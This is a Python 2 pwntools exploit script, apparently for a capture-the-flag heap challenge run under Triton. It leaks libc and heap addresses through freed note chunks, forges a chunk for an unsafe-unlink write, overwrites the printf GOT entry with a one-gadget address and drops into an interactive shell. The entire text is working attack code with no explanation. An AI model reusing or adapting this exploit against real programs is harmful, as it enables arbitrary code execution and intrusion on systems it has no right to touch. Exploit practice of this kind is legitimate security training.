import struct, time, sys
from subprocess import Popen, PIPE, STDOUT
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read
from pwn import *

running = True

def add(size, cont) :
	return '2\n%d\n%s' % (size, cont)

def rm(num) :
	return '4\n%d\n' % (num)

def list_note() :
	return '1\n'

def edit_note(num, size, cont) :
	return '3\n%d\n%d\n%s' % (num, size, cont)

def p(bytes) :
	return struct.pack('<Q', bytes)

def info_leak_libc(x):
	size = 0x80
	commands = add(size, "A"*size)    # note 0
	commands += add(size, "B"*size)    # note 1

	commands += rm(0)

    # allocate a new note of size 1, this will overwrite one byte of the FD
    # pointer, which we know anyway (0xb8)
	commands += add(1, "\xb8")


    # We simply list the notes to leak the fd pointer
	commands += list_note()

	commands += rm(1)
	commands += rm(0)

    # the addr is followed by a new line and preceeded by A's
	#leak = rt("1.")[-16:]
	#addr = leak.replace("A", "").split("\x0a")[0].ljust(8, '\x00')
	#addr = struct.unpack("<Q", addr)[0]

	x.send(commands)

	x.recvuntil('0. ')
	tmp = x.recvuntil('1. ')

	string = tmp[:8]
	loc2 = tmp.find('\n1. ')
	
	string = string[:loc2] + '\0' * (8 - loc2)
	
	addr = u64(string)
	print 'libc_addr = %x' % (addr)

	return addr

def info_leak_heap(x):
	size = 0x10
	
	commands = add(size, 'A' * size)
	commands += add(size, 'B' * size)
	commands += add(size, 'C' * size)
	commands += add(size, 'D' * size)

	commands += rm(2)
	commands += rm(0)

	commands += add(8, 'E' * 8)
	commands += list_note()

	commands += rm(0)
	commands += rm(1)
	commands += rm(3)

	x.send(commands)

	x.recvuntil('0. ')
	tmp = x.recvuntil('1. ')
	print tmp
	

	string = tmp[8:16]
	loc2 = string.find('\n1. ')
	print 'loc2 = ' + str(loc2)
	
	string = string[:loc2] + '\0' * (8 - loc2)

	
	for c in string:
		print '%x' % ord(c)
	
	addr = u64(string)
	print 'heap_addr = %x' % (addr)

	return addr


def send_exploit(x, heap_addr) :
	size = 0x100

	commands = add(size, 'A' * size)
	commands += add(size, 'B' * size)
	commands += add(size, 'C' * size)

	commands += rm(2)
	commands += rm(1)
	commands += rm(0)

	x.send(commands)

	fd = heap_addr - 0x1808
	bk = fd + 0x8

	content = p(0x0) + p(0x1) + p(fd) + p(bk) + 'A' * (size - 0x20) + p(0x100) + p(0x110) + 'B' * size + p(0) + p(0x111) + 'C' * (size - 0x20)	

	commands = add(3*size, content)
	commands += rm(1)
	commands += edit_note(0, 0x300, p(0x100) + p(1) + p(0x8) + p(printf_got) + "A"*736)
	commands += edit_note(0, 8, p(one_shot_shell))
	x.send(commands)


x = process(['./triton', 'plugins/prova1.py', sys.argv[1]])

x.sendline('Y')
x.recv(timeout=2)

printf_got = 0x602030

libc_addr = info_leak_libc(x)
one_shot_shell = libc_addr - 0x3782b8
heap_addr = info_leak_heap(x)
send_exploit(x, heap_addr)
sleep(2)
print 'shell spawned hopefully...'
x.interactive()
